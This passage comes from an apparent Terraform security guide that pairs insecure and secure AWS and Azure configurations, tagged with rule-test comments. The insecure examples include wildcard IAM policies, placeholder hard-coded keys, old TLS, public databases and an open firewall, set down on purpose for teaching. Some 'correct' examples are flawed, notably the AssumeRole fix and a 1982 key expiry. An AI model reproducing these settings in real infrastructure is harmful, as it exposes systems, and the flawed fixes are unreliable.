      "Action": "*",
      "Effect": "Allow",
      "Resource": "*",
      "Sid": ""
    }
  ],
  "Version": "2012-10-17"
}
POLICY
}
```

**Correct: IAM - policy with specific permissions**

```hcl
resource "aws_iam_policy" "pass1" {
  name = "pass1"
  path = "/"
  policy = <<POLICY
{
  "Statement": [
    {
      "Action": [
        "s3:ListBucket*",
        "s3:HeadBucket",
        "s3:Get*"
      ],
      "Effect": "Allow",
      "Resource": [
        "arn:aws:s3:::b1",
        "arn:aws:s3:::b1/*",
        "arn:aws:s3:::b2",
        "arn:aws:s3:::b2/*"
      ],
      "Sid": ""
    },
    {
      "Action": "s3:PutObject*",
      "Effect": "Allow",
      "Resource": "arn:aws:s3:::b1/*",
      "Sid": ""
    }
  ],
  "Version": "2012-10-17"
}
POLICY
}
```

**Incorrect: IAM - wildcard AssumeRole policy**

```hcl
resource "aws_iam_role" "bad" {
  name = var.role_name
  # ruleid: wildcard-assume-role
  assume_role_policy = <<POLICY
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "*"
      },
      "Action": "sts:AssumeRole",
      "Condition": {}
    }
  ]
}
POLICY
}
```

**Correct: IAM - restricted AssumeRole policy**

```hcl
resource "aws_iam_role" "ok" {
  name = var.role_name
  # ok: wildcard-assume-role
  assume_role_policy = <<POLICY
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "*"
      },
      "Action": "arn:aws:iam::${data.aws_caller_identity.current.account_id}:root",
      "Condition": {}
    }
  ]
}
POLICY
}
```

**Incorrect: Lambda - with hard-coded credentials**

```hcl
resource "aws_lambda_function" "fail" {
  function_name = "stest-env"
  role = ""
  runtime = "python3.8"

  environment {
    variables = {
      # ruleid: aws-lambda-environment-credentials
      AWS_ACCESS_KEY_ID     = "AKIAIOSFODNN7EXAMPLE",
      # ruleid: aws-lambda-environment-credentials
      AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
      AWS_DEFAULT_REGION    = "us-west-2"
    }
  }
}
```

**Correct: Lambda - without credentials**

```hcl
resource "aws_lambda_function" "pass" {
  function_name = "test-env"
  role = ""
  runtime = "python3.8"

  environment {
    variables = {
      AWS_DEFAULT_REGION = "us-west-2"
    }
  }
}
```

**Incorrect: Lambda - permission without source ARN**

```hcl
# ruleid: aws-lambda-permission-unrestricted-source-arn
resource "aws_lambda_permission" "fail_1" {
  statement_id  = "AllowExecutionFromSNS"
  action        = "lambda:InvokeFunction"
  function_name = aws_lambda_function.func.function_name
  principal     = "sns.amazonaws.com"
}

# ruleid: aws-lambda-permission-unrestricted-source-arn
resource "aws_lambda_permission" "fail_3" {
  statement_id  = "AllowMyDemoAPIInvoke"
  action        = "lambda:InvokeFunction"
  function_name = "MyDemoFunction"
  principal     = "apigateway.amazonaws.com"
}
```

**Correct: Lambda - permission with source ARN**

```hcl
# ok: aws-lambda-permission-unrestricted-source-arn
resource "aws_lambda_permission" "pass_1" {
  statement_id  = "AllowExecutionFromSNS"
  action        = "lambda:InvokeFunction"
  function_name = aws_lambda_function.func.function_name
  principal     = "sns.amazonaws.com"
  source_arn    = aws_sns_topic.default.arn
}

# ok: aws-lambda-permission-unrestricted-source-arn
resource "aws_lambda_permission" "pass_3" {
  statement_id  = "AllowMyDemoAPIInvoke"
  action        = "lambda:InvokeFunction"
  function_name = "MyDemoFunction"
  principal     = "apigateway.amazonaws.com"

  # The /* part allows invocation from any stage, method and resource path
  # within API Gateway.
  source_arn = "${aws_api_gateway_rest_api.MyDemoAPI.execution_arn}/*"
}
```

**Incorrect: KMS - key without rotation**

```hcl
# ruleid: aws-kms-no-rotation
resource "aws_kms_key" "fail1" {
  description             = "KMS key 1"
  deletion_window_in_days = 10
}

# ruleid: aws-kms-no-rotation
resource "aws_kms_key" "fail2" {
  description             = "KMS key 1"
  deletion_window_in_days = 10
  enable_key_rotation = false
}
```

**Correct: KMS - key with rotation enabled**

```hcl
resource "aws_kms_key" "pass1" {
  description             = "KMS key 1"
  deletion_window_in_days = 10
  enable_key_rotation = true
}
```

**Incorrect: SQS - unencrypted queue**

```hcl
# ruleid: aws-sqs-queue-unencrypted
resource "aws_sqs_queue" "fail_1" {
  name = "terraform-example-queue"
}

# ruleid: aws-sqs-queue-unencrypted
resource "aws_sqs_queue" "fail_2" {
  name                    = "terraform-example-queue"
  sqs_managed_sse_enabled = false
}
```

**Correct: SQS - encrypted queue**

```hcl
# ok: aws-sqs-queue-unencrypted
resource "aws_sqs_queue" "pass_1" {
  name                    = "terraform-example-queue"
  sqs_managed_sse_enabled = true
}

# ok: aws-sqs-queue-unencrypted
resource "aws_sqs_queue" "pass_2" {
  name                              = "terraform-example-queue"
  kms_master_key_id                 = "alias/aws/sqs"
  kms_data_key_reuse_period_seconds = 300
}
```

**Incorrect: SNS - unencrypted topic**

```hcl
# ruleid: aws-sns-topic-unencrypted
resource "aws_sns_topic" "fail" {}
```

**Correct: SNS - encrypted topic**

```hcl
# ok: aws-sns-topic-unencrypted
resource "aws_sns_topic" "pass" {
  kms_master_key_id = "someKey"
}
```

**Incorrect: DynamoDB - without CMK encryption**

```hcl
# ruleid: aws-dynamodb-table-unencrypted
resource "aws_dynamodb_table" "default" {
  name           = "GameScores"
  billing_mode   = "PROVISIONED"
  read_capacity  = 20
  write_capacity = 20
  hash_key       = "UserId"
  range_key      = "UserId"

  attribute {
    name = "UserId"
    type = "S"
  }
}

# ruleid: aws-dynamodb-table-unencrypted
resource "aws_dynamodb_table" "encrypted_no_cmk" {
  name           = "GameScores"
  billing_mode   = "PROVISIONED"
  read_capacity  = 20
  write_capacity = 20
  hash_key       = "UserId"
  range_key      = "UserId"

  attribute {
    name = "UserId"
    type = "S"
  }

  server_side_encryption {
      enabled = true
  }
}
```

**Correct: DynamoDB - with CMK encryption**

```hcl
resource "aws_dynamodb_table" "cmk" {
  name           = "GameScores"
  billing_mode   = "PROVISIONED"
  read_capacity  = 20
  write_capacity = 20
  hash_key       = "UserId"
  range_key      = "UserId"

  attribute {
    name = "UserId"
    type = "S"
  }

  server_side_encryption {
      enabled = true
      kms_key_arn = "arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab"
  }
}
```

**Incorrect: ECR - with mutable tags**

```hcl
# ruleid: aws-ecr-mutable-image-tags
resource "aws_ecr_repository" "fail_1" {
  name = "example"
}

# ruleid: aws-ecr-mutable-image-tags
resource "aws_ecr_repository" "fail_2" {
  name                 = "example"
  image_tag_mutability = "MUTABLE"
}
```

**Correct: ECR - with immutable tags**

```hcl
# ok: aws-ecr-mutable-image-tags
resource "aws_ecr_repository" "pass" {
  name                 = "example"
  image_tag_mutability = "IMMUTABLE"
}
```

**Incorrect: CloudTrail - without encryption**

```hcl
# ruleid: aws-cloudtrail-encrypted-with-cmk
resource "aws_cloudtrail" "fail" {
  name                          = "TRAIL"
  s3_bucket_name                = aws_s3_bucket.test.id
  include_global_service_events = true
}
```

**Correct: CloudTrail - with CMK encryption**

```hcl
resource "aws_cloudtrail" "pass" {
  name                          = "TRAIL"
  s3_bucket_name                = aws_s3_bucket.test.id
  include_global_service_events = true
  kms_key_id                    = aws_kms_key.test.arn
}
```

**Incorrect: Elasticsearch - with insecure TLS**

```hcl
# ruleid: aws-elasticsearch-insecure-tls-version
resource "aws_elasticsearch_domain" "badCode" {
  domain_name = "badCode"
  domain_endpoint_options {
    enforce_https = true
    tls_security_policy = "Policy-Min-TLS-1-0-2019-07"
  }
}
```

**Correct: Elasticsearch - with TLS 1.2**

```hcl
resource "aws_elasticsearch_domain" "okCode" {
  domain_name = "okCode"
  domain_endpoint_options {
    enforce_https = true
    tls_security_policy = "Policy-Min-TLS-1-2-2019-07"
  }
}
```

**Incorrect: Load Balancer - with insecure TLS**

```hcl
resource "aws_lb_listener" "https_2016" {
  load_balancer_arn = var.aws_lb_arn
  protocol          = "HTTPS"
  port              = "443"
  # ruleid: insecure-load-balancer-tls-version
  ssl_policy        = "ELBSecurityPolicy-2016-08"
  certificate_arn   = var.certificate_arn

  default_action {
    type             = "forward"
    target_group_arn = var.aws_lb_target_group_arn
  }
}

resource "aws_lb_listener" "http" {
  load_balancer_arn = var.aws_lb_arn
  # ruleid: insecure-load-balancer-tls-version
  protocol          = "HTTP"
  port              = "80"

  default_action {
    type             = "forward"
    target_group_arn = var.aws_lb_target_group_arn
  }
}
```

**Correct: Load Balancer - with TLS 1.2+**

```hcl
resource "aws_lb_listener" "https_fs_1_2" {
  load_balancer_arn = var.aws_lb_arn
  protocol          = "HTTPS"
  port              = "443"
  # ok: insecure-load-balancer-tls-version
  ssl_policy        = "ELBSecurityPolicy-FS-1-2-Res-2019-08"
  certificate_arn   = var.certificate_arn

  default_action {
    type             = "forward"
    target_group_arn = var.aws_lb_target_group_arn
  }
}

resource "aws_lb_listener" "http_redirect" {
  load_balancer_arn = var.aws_lb_arn
  # ok: insecure-load-balancer-tls-version
  protocol          = "HTTP"
  port              = "80"

  default_action {
    type = "redirect"

    redirect {
      port        = "443"
      protocol    = "HTTPS"
      status_code = "HTTP_301"
    }
  }
}
```

**Incorrect: VPC - subnet with public IP assignment**

```hcl
# ruleid: aws-subnet-has-public-ip-address
resource "aws_subnet" "fail_1" {
  vpc_id                  = "vpc-123456"
  map_public_ip_on_launch = true
}

# ruleid: aws-subnet-has-public-ip-address
resource "aws_default_subnet" "fail_2" {
  availability_zone = "us-west-2a"
}
```

**Correct: VPC - subnet without public IP assignment**

```hcl
# ok: aws-subnet-has-public-ip-address
resource "aws_subnet" "pass_1" {
  vpc_id = "vpc-123456"
}

# ok: aws-subnet-has-public-ip-address
resource "aws_subnet" "pass_2" {
  vpc_id                  = "vpc-123456"
  map_public_ip_on_launch = false
}

# ok: aws-subnet-has-public-ip-address
resource "aws_default_subnet" "pass_3" {
  availability_zone       = "us-west-2a"
  map_public_ip_on_launch = false
}
```

**Incorrect: CodeBuild - with unencrypted artifacts**

```hcl
resource "aws_codebuild_project" "fail_1" {
  name         = "test-project"
  service_role = aws_iam_role.example.arn

  # ruleid: aws-codebuild-artifacts-unencrypted
  artifacts {
    encryption_disabled = true
    type                = "CODEPIPELINE"
  }

  environment {
    compute_type = "BUILD_GENERAL1_SMALL"
    image        = "aws/codebuild/standard:1.0"
    type         = "LINUX_CONTAINER"
  }

  source {
    type            = "GITHUB"
    location        = "https://github.com/mitchellh/packer.git"
    git_clone_depth = 1
  }
}
```

**Correct: CodeBuild - with encrypted artifacts**

```hcl
resource "aws_codebuild_project" "pass_4" {
  name         = "test-project"
  service_role = aws_iam_role.example.arn

  # ok: aws-codebuild-artifacts-unencrypted
  artifacts {
    type                = "CODEPIPELINE"
    encryption_disabled = false
  }

  environment {
    compute_type = "BUILD_GENERAL1_SMALL"
    image        = "aws/codebuild/standard:1.0"
    type         = "LINUX_CONTAINER"
  }

  source {
    type            = "GITHUB"
    location        = "https://github.com/mitchellh/packer.git"
    git_clone_depth = 1
  }
}
```

**Incorrect: AWS Provider - with hard-coded credentials**

```hcl
provider "aws" {
  region     = "us-west-2"
  access_key = "AKIAEXAMPLEKEY"
  # ruleid: aws-provider-static-credentials
  secret_key = "randomcharactersabcdef"
  profile = "customprofile"
}
```

**Correct: AWS Provider - using shared credentials file**

```hcl
# ok: aws-provider-static-credentials
provider "aws" {
  region                  = "us-west-2"
  shared_credentials_file = "/Users/tf_user/.aws/creds"
  profile                 = "customprofile"
}
```

### 0.22 Secure Azure Terraform Configurations

**Impact: HIGH**

This guide documents security best practices for Azure infrastructure provisioned via Terraform. Misconfigurations in cloud infrastructure can lead to data breaches, unauthorized access, and compliance violations.

**Incorrect: Azure Storage - TLS version missing or outdated**

```hcl
# ruleid: storage-use-secure-tls-policy
resource "azurerm_storage_account" "bad_example" {
  name                     = "storageaccountname"
  resource_group_name      = azurerm_resource_group.example.name
  location                 = azurerm_resource_group.example.location
}

# ruleid: storage-use-secure-tls-policy
resource "azurerm_storage_account" "bad_example" {
  name                     = "storageaccountname"
  resource_group_name      = azurerm_resource_group.example.name
  location                 = azurerm_resource_group.example.location
  min_tls_version          = "TLS1_0"
}
```

**Correct: Azure Storage - TLS 1.2 enforced**

```hcl
resource "azurerm_storage_account" "good_example" {
  name                     = "storageaccountname"
  resource_group_name      = azurerm_resource_group.example.name
  location                 = azurerm_resource_group.example.location
  min_tls_version          = "TLS1_2"
}
```

**Incorrect: Azure Storage - network rules allow all traffic**

```hcl
# ruleid: storage-default-action-deny
resource "azurerm_storage_account_network_rules" "bad_example" {
  default_action             = "Allow"
  ip_rules                   = ["127.0.0.1"]
  virtual_network_subnet_ids = [azurerm_subnet.test.id]
  bypass                     = ["Metrics"]
}
```

**Correct: Azure Storage - network rules deny by default**

```hcl
resource "azurerm_storage_account_network_rules" "good_example" {
  default_action             = "Deny"
  ip_rules                   = ["127.0.0.1"]
  virtual_network_subnet_ids = [azurerm_subnet.test.id]
  bypass                     = ["Metrics"]
}
```

**Incorrect: Azure Storage - HTTP traffic allowed**

```hcl
# ruleid: storage-enforce-https
resource "azurerm_storage_account" "bad_example" {
  name                      = "storageaccountname"
  resource_group_name       = azurerm_resource_group.example.name
  location                  = azurerm_resource_group.example.location
  account_tier              = "Standard"
  account_replication_type  = "GRS"
  enable_https_traffic_only = false
}
```

**Correct: Azure Storage - HTTPS only**

```hcl
resource "azurerm_storage_account" "good_example" {
  name                      = "storageaccountname"
  resource_group_name       = azurerm_resource_group.example.name
  location                  = azurerm_resource_group.example.location
  account_tier              = "Standard"
  account_replication_type  = "GRS"
  enable_https_traffic_only = true
}
```

**Incorrect: Azure Storage - queue logging not configured**

```hcl
# ruleid: storage-queue-services-logging
resource "azurerm_storage_account" "bad_example" {
    name                     = "example"
    resource_group_name      = data.azurerm_resource_group.example.name
    location                 = data.azurerm_resource_group.example.location
    account_tier             = "Standard"
    account_replication_type = "GRS"
    queue_properties  {
  }
}
```

**Correct: Azure Storage - queue logging enabled**

```hcl
resource "azurerm_storage_account" "good_example" {
    name                     = "example"
    resource_group_name      = data.azurerm_resource_group.example.name
    location                 = data.azurerm_resource_group.example.location
    account_tier             = "Standard"
    account_replication_type = "GRS"
    queue_properties  {
    logging {
        delete                = true
        read                  = true
        write                 = true
        version               = "1.0"
        retention_policy_days = 10
    }
  }
}
```

**Incorrect: Azure Storage - missing AzureServices bypass**

```hcl
# ruleid: storage-allow-microsoft-service-bypass
resource "azurerm_storage_account" "bad_example" {
  name                = "storageaccountname"
  resource_group_name = azurerm_resource_group.example.name
  location                 = azurerm_resource_group.example.location
  account_tier             = "Standard"
  account_replication_type = "LRS"

  network_rules {
    default_action             = "Deny"
    ip_rules                   = ["100.0.0.1"]
    virtual_network_subnet_ids = [azurerm_subnet.example.id]
      bypass                     = ["Metrics"]
  }
}
```

**Correct: Azure Storage - AzureServices bypass included**

```hcl
resource "azurerm_storage_account" "good_example" {
  name                = "storageaccountname"
  resource_group_name = azurerm_resource_group.example.name
  location                 = azurerm_resource_group.example.location
  account_tier             = "Standard"
  account_replication_type = "LRS"

  network_rules {
    default_action             = "Deny"
    ip_rules                   = ["100.0.0.1"]
    virtual_network_subnet_ids = [azurerm_subnet.example.id]
    bypass                     = ["Metrics", "AzureServices"]
  }
}
```

**Incorrect: Azure Storage - blob container public access**

```hcl
# ruleid: azure-storage-blob-service-container-private-access
resource "azurerm_storage_container" "example" {
    name                  = "vhds"
    storage_account_name  = azurerm_storage_account.example.name
    container_access_type = "blob"
}
```

**Correct: Azure Storage - blob container private access**

```hcl
resource "azurerm_storage_container" "example" {
    name                  = "vhds"
    storage_account_name  = azurerm_storage_account.example.name
    container_access_type = "private"
}
```

**Incorrect: Azure App Service - outdated TLS version**

```hcl
resource "azurerm_app_service" "bad_example" {
  name                = "example-app-service"
  location            = azurerm_resource_group.example.location
  resource_group_name = azurerm_resource_group.example.name
  app_service_plan_id = azurerm_app_service_plan.example.id

  site_config {
    # ruleid: appservice-use-secure-tls-policy
      min_tls_version = "1.0"
  }
}
```

**Correct: Azure App Service - TLS 1.2**

```hcl
resource "azurerm_app_service" "good_example" {
  name                = "example-app-service"
  location            = azurerm_resource_group.example.location
  resource_group_name = azurerm_resource_group.example.name
  app_service_plan_id = azurerm_app_service_plan.example.id

  site_config {
      min_tls_version = "1.2"
  }
}
```

**Incorrect: Azure App Service - HTTPS not enforced**

```hcl
# ruleid: appservice-enable-https-only
resource "azurerm_app_service" "bad_example" {
  name                = "example-app-service"
  location            = azurerm_resource_group.example.location
  resource_group_name = azurerm_resource_group.example.name
  app_service_plan_id = azurerm_app_service_plan.example.id
  https_only          = false
}

# ruleid: appservice-enable-https-only
resource "azurerm_app_service" "bad_example" {
  name                = "example-app-service"
  location            = azurerm_resource_group.example.location
  resource_group_name = azurerm_resource_group.example.name
  app_service_plan_id = azurerm_app_service_plan.example.id
}
```

**Correct: Azure App Service - HTTPS enforced**

```hcl
resource "azurerm_app_service" "good_example" {
    name                       = "example-app-service"
    location                   = azurerm_resource_group.example.location
    resource_group_name        = azurerm_resource_group.example.name
    app_service_plan_id        = azurerm_app_service_plan.example.id
    https_only                 = true
}
```

**Incorrect: Azure App Service - authentication disabled**

```hcl
# ruleid: appservice-authentication-enabled
resource "azurerm_app_service" "bad_example" {
  name                = "example-app-service"
  location            = azurerm_resource_group.example.location
  resource_group_name = azurerm_resource_group.example.name
  app_service_plan_id = azurerm_app_service_plan.example.id
}

# ruleid: appservice-authentication-enabled
resource "azurerm_app_service" "bad_example" {
  name                = "example-app-service"
  location            = azurerm_resource_group.example.location
  resource_group_name = azurerm_resource_group.example.name
  app_service_plan_id = azurerm_app_service_plan.example.id

  auth_settings {
    enabled = false
  }
}
```

**Correct: Azure App Service - authentication enabled**

```hcl
resource "azurerm_app_service" "good_example" {
  name                = "example-app-service"
  location            = azurerm_resource_group.example.location
  resource_group_name = azurerm_resource_group.example.name
  app_service_plan_id = azurerm_app_service_plan.example.id

  auth_settings {
    enabled = true
  }
}
```

**Incorrect: Azure App Service - remote debugging enabled**

```hcl
# ruleid: azure-remote-debugging-not-enabled
resource "azurerm_app_service" "example" {
    name                = "example-app-service"
    location            = azurerm_resource_group.example.location
    resource_group_name = azurerm_resource_group.example.name
    app_service_plan_id = azurerm_app_service_plan.example.id

    site_config {
    dotnet_framework_version = "v4.0"
    scm_type                 = "LocalGit"
    }
    remote_debugging_enabled = true
}
```

**Correct: Azure App Service - remote debugging disabled**

```hcl
resource "azurerm_app_service" "example" {
    name                = "example-app-service"
    location            = azurerm_resource_group.example.location
    resource_group_name = azurerm_resource_group.example.name
    app_service_plan_id = azurerm_app_service_plan.example.id

    site_config {
    dotnet_framework_version = "v4.0"
    scm_type                 = "LocalGit"
    }
    remote_debugging_enabled = false
}
```

**Incorrect: Azure App Service - wildcard CORS origin**

```hcl
resource "azurerm_app_service" "example" {
    name                = "example-app-service"
    location            = azurerm_resource_group.example.location
    resource_group_name = azurerm_resource_group.example.name
    app_service_plan_id = azurerm_app_service_plan.example.id

    site_config {
    dotnet_framework_version = "v4.0"
    scm_type                 = "LocalGit"
    cors {
        # ruleid: azure-appservice-disallowed-cors
        allowed_origins = ["*"]
    }
    }
}
```

**Correct: Azure App Service - specific CORS origins**

```hcl
resource "azurerm_app_service" "example" {
    name                = "example-app-service"
    location            = azurerm_resource_group.example.location
    resource_group_name = azurerm_resource_group.example.name
    app_service_plan_id = azurerm_app_service_plan.example.id

    site_config {
    dotnet_framework_version = "v4.0"
    scm_type                 = "LocalGit"
    cors {
        allowed_origins = ["192.0.0.1"]
    }
    }
}
```

**Incorrect: Azure Function App - authentication disabled**

```hcl
# ruleid: functionapp-authentication-enabled
resource "azurerm_function_app" "bad_example" {
  name                = "example-function-app"
  location            = azurerm_resource_group.example.location
  resource_group_name = azurerm_resource_group.example.name
  app_service_plan_id = azurerm_function_app_plan.example.id
}

# ruleid: functionapp-authentication-enabled
resource "azurerm_function_app" "bad_example" {
  name                = "example-function-app"
  location            = azurerm_resource_group.example.location
  resource_group_name = azurerm_resource_group.example.name
  app_service_plan_id = azurerm_function_app_plan.example.id

  auth_settings {
    enabled = false
  }
}
```

**Correct: Azure Function App - authentication enabled**

```hcl
resource "azurerm_function_app" "good_example" {
  name                = "example-function-app"
  location            = azurerm_resource_group.example.location
  resource_group_name = azurerm_resource_group.example.name
  app_service_plan_id = azurerm_function_app_plan.example.id

  auth_settings {
    enabled = true
  }
}
```

**Incorrect: Azure Function App - wildcard CORS**

```hcl
resource "azurerm_function_app" "example" {
  name                       = "test-azure-functions"
  location                   = azurerm_resource_group.example.location
  resource_group_name        = azurerm_resource_group.example.name
  app_service_plan_id        = azurerm_app_service_plan.example.id
  storage_account_name       = azurerm_storage_account.example.name
  storage_account_access_key = azurerm_storage_account.example.primary_access_key
  site_config {
    cors {
        # ruleid: azure-functionapp-disallow-cors
        allowed_origins = ["*"]
    }
  }
}
```

**Correct: Azure Function App - specific CORS origins**

```hcl
resource "azurerm_function_app" "example" {
  name                       = "test-azure-functions"
  location                   = azurerm_resource_group.example.location
  resource_group_name        = azurerm_resource_group.example.name
  app_service_plan_id        = azurerm_app_service_plan.example.id
  storage_account_name       = azurerm_storage_account.example.name
  storage_account_access_key = azurerm_storage_account.example.primary_access_key
  site_config {
    cors {
        allowed_origins = ["192.0.0.1"]
    }
  }
}
```

**Incorrect: Azure Key Vault - network ACLs missing or allow default**

```hcl
# ruleid: keyvault-specify-network-acl
resource "azurerm_key_vault" "bad_example" {
    name                        = "examplekeyvault"
    location                    = azurerm_resource_group.bad_example.location
    enabled_for_disk_encryption = true
    soft_delete_retention_days  = 7
    purge_protection_enabled    = false
}

# ruleid: keyvault-specify-network-acl
resource "azurerm_key_vault" "bad_example" {
    name                        = "examplekeyvault"
    location                    = azurerm_resource_group.bad_example.location
    enabled_for_disk_encryption = true
    soft_delete_retention_days  = 7
    purge_protection_enabled    = false

    network_acls {
        bypass = "AzureServices"
        default_action = "Allow"
    }
}
```

**Correct: Azure Key Vault - network ACLs with deny default**

```hcl
resource "azurerm_key_vault" "good_example" {
    name                        = "examplekeyvault"
    location                    = azurerm_resource_group.good_example.location
    enabled_for_disk_encryption = true
    soft_delete_retention_days  = 7
    purge_protection_enabled    = false

    network_acls {
        bypass = "AzureServices"
        default_action = "Deny"
    }
}
```

**Incorrect: Azure Key Vault - purge protection disabled**

```hcl
# ruleid: keyvault-purge-enabled
resource "azurerm_key_vault" "bad_example" {
    name                        = "examplekeyvault"
    location                    = azurerm_resource_group.bad_example.location
    enabled_for_disk_encryption = true
    purge_protection_enabled    = false
}

# ruleid: keyvault-purge-enabled
resource "azurerm_key_vault" "bad_example" {
    name                        = "examplekeyvault"
    location                    = azurerm_resource_group.bad_example.location
    enabled_for_disk_encryption = true
}
```

**Correct: Azure Key Vault - purge protection enabled**

```hcl
resource "azurerm_key_vault" "good_example" {
    name                        = "examplekeyvault"
    location                    = azurerm_resource_group.good_example.location
    enabled_for_disk_encryption = true
    soft_delete_retention_days  = 7
    purge_protection_enabled    = true
}
```

**Incorrect: Azure Key Vault - key without expiration date**

```hcl
# ruleid: keyvault-ensure-key-expires
resource "azurerm_key_vault_key" "bad_example" {
  name         = "generated-certificate"
  key_vault_id = azurerm_key_vault.example.id
  key_type     = "RSA"
  key_size     = 2048

  key_opts = [
    "decrypt",
    "encrypt",
    "sign",
    "unwrapKey",
    "verify",
    "wrapKey",
  ]
}
```

**Correct: Azure Key Vault - key with expiration date**

```hcl
resource "azurerm_key_vault_key" "good_example" {
  name         = "generated-certificate"
  key_vault_id = azurerm_key_vault.example.id
  key_type     = "RSA"
  key_size     = 2048
  expiration_date = "1982-12-31T00:00:00Z"

  key_opts = [
    "decrypt",
    "encrypt",
    "sign",
    "unwrapKey",
    "verify",
    "wrapKey",
  ]
}
```

**Incorrect: Azure SQL Server - public network access enabled**

```hcl
# ruleid: azure-sqlserver-public-access-disabled
resource "azurerm_mssql_server" "example" {
    name                         = "mssqlserver"
    resource_group_name          = azurerm_resource_group.example.name
    location                     = azurerm_resource_group.example.location
    version                      = "12.0"
    administrator_login          = "missadministrator"
    administrator_login_password = "thisIsKat11"
    minimum_tls_version          = "1.2"
    public_network_access_enabled = true
    azuread_administrator {
    login_username = "AzureAD Admin"
    object_id      = "00000000-0000-0000-0000-000000000000"
    }
}

# ruleid: azure-sqlserver-public-access-disabled
resource "azurerm_mssql_server" "example" {
    name                         = "mssqlserver"
    resource_group_name          = azurerm_resource_group.example.name
    location                     = azurerm_resource_group.example.location
    version                      = "12.0"
    administrator_login          = "missadministrator"
    administrator_login_password = "thisIsKat11"
    minimum_tls_version          = "1.2"
    azuread_administrator {
    login_username = "AzureAD Admin"
    object_id      = "00000000-0000-0000-0000-000000000000"
    }
}
```

**Correct: Azure SQL Server - public network access disabled**

```hcl
resource "azurerm_mssql_server" "example" {
    name                         = "mssqlserver"
    resource_group_name          = azurerm_resource_group.example.name
    location                     = azurerm_resource_group.example.location
    version                      = "12.0"
    administrator_login          = "missadministrator"
    administrator_login_password = "thisIsKat11"
    minimum_tls_version          = "1.2"
    public_network_access_enabled = false
    azuread_administrator {
    login_username = "AzureAD Admin"
    object_id      = "00000000-0000-0000-0000-000000000000"
    }
}
```

**Incorrect: Azure MSSQL - outdated TLS version**

```hcl
resource "azurerm_mssql_server" "examplea" {
    name                          = var.server_name
    resource_group_name           = var.resource_group.name
    location                      = var.resource_group.location
    version                       = var.sql["version"]
    administrator_login           = var.sql["administrator_login"]
    administrator_login_password  = local.administrator_login_password
    # ruleid: azure-mssql-service-mintls-version
    minimum_tls_version           = "1.0"
    public_network_access_enabled = var.sql["public_network_access_enabled"]
    identity {
    type = "SystemAssigned"
    }
}
```

**Correct: Azure MSSQL - TLS 1.2**

```hcl
resource "azurerm_mssql_server" "examplea" {
    name                          = var.server_name
    resource_group_name           = var.resource_group.name
    location                      = var.resource_group.location
    version                       = var.sql["version"]
    administrator_login           = var.sql["administrator_login"]
    administrator_login_password  = local.administrator_login_password
    minimum_tls_version           = "1.2"
    public_network_access_enabled = var.sql["public_network_access_enabled"]
    identity {
    type = "SystemAssigned"
    }
}
```

**Incorrect: Azure SQL - wide-open firewall rule**

```hcl
# ruleid: azure-sqlserver-no-public-access
resource "azurerm_mysql_firewall_rule" "example" {
  name                = "office"
  resource_group_name = azurerm_resource_group.example.name
  server_name         = azurerm_mysql_server.example.name
  start_ip_address    = "0.0.0.0"
  end_ip_address      = "255.255.255.255"
}
```

**Correct: Azure SQL - specific IP range**

```hcl
resource "azurerm_mysql_firewall_rule" "example" {
  name                = "office"
  resource_group_name = azurerm_resource_group.example.name
  server_name         = azurerm_mysql_server.example.name
  start_ip_address    = "40.112.8.12"
  end_ip_address      = "40.112.8.17"
}
```

**Incorrect: Azure MySQL - public network access enabled**

```hcl
# ruleid: azure-mysql-public-access-disabled
resource "azurerm_mysql_server" "example" {
  name                = var.mysqlserver_name
  location            = var.resource_group.location
  resource_group_name = var.resource_group.name

  administrator_login          = var.admin_name
  administrator_login_password = var.password
  sku_name = var.sku_name
  storage_mb = var.storage_mb
  version    = var.server_version

  auto_grow_enabled            = true
  backup_retention_days        = 7
  geo_redundant_backup_enabled = false
  infrastructure_encryption_enabled = false
    public_network_access_enabled = true
}

# ruleid: azure-mysql-public-access-disabled
resource "azurerm_mysql_server" "example" {
  name                = var.mysqlserver_name
  location            = var.resource_group.location
  resource_group_name = var.resource_group.name

  administrator_login          = var.admin_name
  administrator_login_password = var.password
  sku_name = var.sku_name
  storage_mb = var.storage_mb
  version    = var.server_version

  auto_grow_enabled            = true
  backup_retention_days        = 7
  geo_redundant_backup_enabled = false
  infrastructure_encryption_enabled = false
}
```

**Correct: Azure MySQL - public network access disabled**

```hcl
resource "azurerm_mysql_server" "example" {
  name                = var.mysqlserver_name
  location            = var.resource_group.location
  resource_group_name = var.resource_group.name

  administrator_login          = var.admin_name
  administrator_login_password = var.password
  sku_name = var.sku_name
  storage_mb = var.storage_mb
  version    = var.server_version

  auto_grow_enabled            = true
  backup_retention_days        = 7
  geo_redundant_backup_enabled = false
  infrastructure_encryption_enabled = false
  public_network_access_enabled = false
}
```

**Incorrect: Azure PostgreSQL - public network access enabled**

```hcl
# ruleid: azure-postgresql-server-public-access-disabled
resource "azurerm_postgresql_server" "example" {
    name                = "example-psqlserver"
    location            = azurerm_resource_group.example.location
    resource_group_name = azurerm_resource_group.example.name

    administrator_login          = "psqladminun"
    administrator_login_password = "H@Sh1CoR3!"

    sku_name   = "GP_Gen5_4"
    version    = "9.6"
    storage_mb = 640000

    backup_retention_days        = 7
    geo_redundant_backup_enabled = true
    auto_grow_enabled            = true

    public_network_access_enabled    = true
    ssl_enforcement_enabled          = true
    ssl_minimal_tls_version_enforced = "TLS1_2"
}
```

**Correct: Azure PostgreSQL - public network access disabled**

```hcl
resource "azurerm_postgresql_server" "example" {
    name                = "example-psqlserver"
    location            = azurerm_resource_group.example.location
    resource_group_name = azurerm_resource_group.example.name

    administrator_login          = "psqladminun"
    administrator_login_password = "H@Sh1CoR3!"

    sku_name   = "GP_Gen5_4"
    version    = "9.6"
    storage_mb = 640000

    backup_retention_days        = 7
    geo_redundant_backup_enabled = true
    auto_grow_enabled            = true

    public_network_access_enabled    = false
    ssl_enforcement_enabled          = true
    ssl_minimal_tls_version_enforced = "TLS1_2"
}
```

**Incorrect: Azure AKS - public cluster**

```hcl
# ruleid: azure-aks-private-clusters-enabled
resource "azurerm_kubernetes_cluster" "example" {
name                = "example-aks1"
location            = azurerm_resource_group.example.location
resource_group_name = azurerm_resource_group.example.name
dns_prefix          = "exampleaks1"

    default_node_pool {
    name       = "default"
    node_count = 1
    vm_size    = "Standard_D2_v2"
    }
